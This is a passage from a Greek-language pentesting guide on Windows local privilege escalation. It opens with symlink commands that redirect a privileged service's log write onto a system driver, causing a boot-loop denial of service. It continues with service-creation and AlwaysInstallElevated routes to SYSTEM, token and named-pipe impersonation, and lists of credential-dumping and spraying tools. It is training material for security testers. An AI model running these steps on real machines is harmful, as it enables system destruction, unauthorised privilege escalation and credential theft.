mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε το privileged component να γράψει το log (π.χ., ο admin ενεργοποιεί "send test SMS"). Η εγγραφή τώρα καταλήγει στο `C:\Windows\System32\cng.sys`.
4. Επιθεωρήστε τον overwritten target (hex/PE parser) για να επιβεβαιώσετε τη διαφθορά· επανεκκίνηση αναγκάζει τα Windows να φορτώσουν το τροποποιημένο driver path → **boot loop DoS**. Αυτό επίσης γενικεύεται σε οποιοδήποτε προστατευμένο αρχείο που μια privileged service θα ανοίξει για εγγραφή.

> `cng.sys` φορτώνεται κανονικά από `C:\Windows\System32\drivers\cng.sys`, αλλά αν ένα αντίγραφο υπάρχει στο `C:\Windows\System32\cng.sys` μπορεί να επιχειρηθεί πρώτο, καθιστώντας το έναν αξιόπιστο DoS sink για κατεστραμμένα δεδομένα.



## **Από High Integrity σε SYSTEM**

### **Νέα υπηρεσία**

Αν ήδη τρέχετε σε μια High Integrity διαδικασία, το **path to SYSTEM** μπορεί να είναι εύκολο απλά **δημιουργώντας και εκτελώντας μια νέα υπηρεσία**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Όταν δημιουργείτε ένα service binary βεβαιωθείτε ότι είναι ένα έγκυρο service ή ότι το binary εκτελεί τις απαραίτητες ενέργειες αρκετά γρήγορα, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρο service.

### AlwaysInstallElevated

Από μια High Integrity διεργασία μπορείτε να προσπαθήσετε να **ενεργοποιήσετε τις καταχωρήσεις μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας έναν _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες για τα κλειδιά μητρώου που εμπλέκονται και πώς να εγκαταστήσετε ένα _.msi_ πακέτο εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια ήδη High Integrity διεργασία), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (όχι προστατευμένες διεργασίες) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **αυθαίρετη διεργασία με εκείνο το token**.\
Η χρήση αυτής της τεχνικής συνήθως επιλέγει **κάποια διεργασία που τρέχει ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε SYSTEM διεργασίες χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για escalation στο `getsystem`. Η τεχνική συνίσταται στο **δημιουργία ενός named pipe και στη συνέχεια στη δημιουργία/κατάχρηση ενός service για να γράψει σε αυτό το pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα είναι σε θέση να **impersonate το token** του pipe client (του service) αποκτώντας SYSTEM privileges.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes πρέπει να διαβάσετε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα [**πώς να πάτε από high integrity σε System χρησιμοποιώντας name pipes διαβάστε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **hijack a dll** που **φορτώνεται** από μια **process** που τρέχει ως **SYSTEM** θα μπορέσετε να εκτελέσετε αυθαίρετο κώδικα με αυτά τα δικαιώματα. Επομένως το Dll Hijacking είναι επίσης χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι πολύ **πιο εύκολο να επιτευχθεί από μια high integrity process** καθώς θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση των dlls.\
**Μπορείτε** [**να μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Καλύτερο εργαλείο για την αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για λανθασμένες ρυθμίσεις και ευαίσθητα αρχεία (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίστηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για κάποιες πιθανές λανθασμένες ρυθμίσεις και συλλογή πληροφοριών (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για λανθασμένες ρυθμίσεις**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες συνόδων από PuTTY, WinSCP, SuperPuTTY, FileZilla, και RDP. Χρησιμοποιήστε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Εντοπίστηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray τα συλλεχθέντα passwords στο domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS spoofer και εργαλείο man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική enumeration για privesc στα Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών privesc ευπαθειών (DEPRECATED για Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζητά γνωστές privesc ευπάθειες (πρέπει να μεταγλωττιστεί με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Κάνει enumeration του host αναζητώντας κακοδιαμορφώσεις (πιο εργαλείο συλλογής πληροφοριών παρά privesc) (πρέπει να μεταγλωττιστεί) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά προγράμματα (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για κακοδιαμορφώσεις (εκτελέσιμο precompiled στο github). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές κακοδιαμορφώσεις (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά στα Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο δημιουργημένο βάσει αυτής της δημοσίευσης (δεν χρειάζεται accesschk για να λειτουργήσει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει λειτουργικά exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει λειτουργικά exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να μεταγλωττίσετε το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο θύμα μπορείτε να κάνετε:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
